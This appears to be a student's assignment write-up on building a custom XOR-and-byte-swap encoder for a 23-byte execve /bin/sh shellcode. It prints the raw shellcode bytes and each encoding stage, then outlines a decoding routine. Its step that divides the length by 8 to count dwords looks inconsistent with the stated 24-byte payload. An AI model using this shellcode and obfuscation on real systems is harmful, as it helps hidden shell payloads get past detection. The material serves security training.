# Assignment 4: Create a custom encoder

## Objectives

In this assignment I have to:
	* create a custom encoding scheme
	* create a full weaponized PoC with execve-stack shellcode

## Encoding out payload

The shellcode for execve-stack, with some optimization is 23 bytes long:

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"

First step is to align this payload so to be a 4 multiple. Let's use \x90 as padding.

"\x31\xc0\x50\x68"
"\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69"
"\x6e\x89\xe3\x31"
"\xc9\x31\xd2\xb0"
"\x0b\xcd\x80\x90"

We can XOR this block with a KEY. The key is 0xdeadbeef in our example.

"\xef\x6d\xee\x87"
"\xf1\x82\xcd\x87"
"\xb6\x82\xdc\x86"
"\xb0\x24\x5d\xde"
"\x17\x9c\x6c\x5f"
"\xd5\x60\x3e\x7f"

We can swap first half and second half of each word

"\x87\xee\x6d\xef"
"\x87\xcd\x82\xf1"
"\x86\xdc\x82\xb6"
"\xde\x5d\x24\xb0"
"\x5f\x6c\x9c\x17"
"\x7f\x3e\x60\xd5"

We prepend the payload with the actual number of byte of the shellcode, XOR-ed with the obfuscation key 0xdeadbeef

We have 24 bytes as payload
"\x18\x18\x18\x18" -> xor(0xdeadbeef) -> "\xc6\xb5\xa6\xf7"
Storing it swapped: "\xf7\xa6\xb5\xc6"

"\xf7\xa6\xb5\xc6"
"\x87\xee\x6d\xef"
"\x87\xcd\x82\xf1"
"\x86\xdc\x82\xb6"
"\xde\x5d\x24\xb0"
"\x5f\x6c\x9c\x17"
"\x7f\x3e\x60\xd5"

## Decoding routine

Given an encoded payload, the decoding route must be in place to make sure to
revert our strategy.

1) take the first dword, swap bytes and XOR with hardcoded key
2) divide the value stored in AL with 8 and store on EDX the number of words
	the payload is length
3) for each of the n dword(s)
	3.1) byte swap the words
	3.2) xor with the encoding key
